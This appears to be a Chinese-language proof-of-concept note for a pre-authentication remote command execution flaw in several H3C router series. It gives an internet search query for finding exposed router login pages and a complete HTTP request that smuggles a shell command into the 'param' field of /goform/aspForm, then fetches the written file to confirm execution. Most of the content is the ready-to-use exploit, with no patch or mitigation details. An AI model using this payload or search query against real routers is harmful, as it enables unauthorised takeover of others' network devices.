# H3C多系列路由器存在前台远程命令执行漏洞

# 一、漏洞简介
 H3C多系列路由器存在前台远程命令执行漏洞。

# 二、影响版本
+ H3C多系列路由器

# 三、资产测绘
+ hunter`app.name="H3C Router Management"`
+ 登录页面

![1693536029401-fe49c297-e04b-42c4-8935-a0a3181716cd.png](./img/z8D5fn4DzBurWTEr/1693536029401-fe49c297-e04b-42c4-8935-a0a3181716cd-011282.png)

# 四、漏洞复现
```java
POST /goform/aspForm HTTP/1.1
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Host: 

CMD=DelL2tpLNSList&GO=vpn_l2tp_session.asp&param=1; $(ls>/www/test);
```

![1708148458826-c9fecdad-19a8-4f2f-afb8-2edb86c89119.png](./img/z8D5fn4DzBurWTEr/1708148458826-c9fecdad-19a8-4f2f-afb8-2edb86c89119-875058.png)

```java
/test
```

![1708148479113-de8c50b3-1388-4543-b5ad-245ab43716a0.png](./img/z8D5fn4DzBurWTEr/1708148479113-de8c50b3-1388-4543-b5ad-245ab43716a0-505670.png)



> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tp0a94dpgkk64aqo>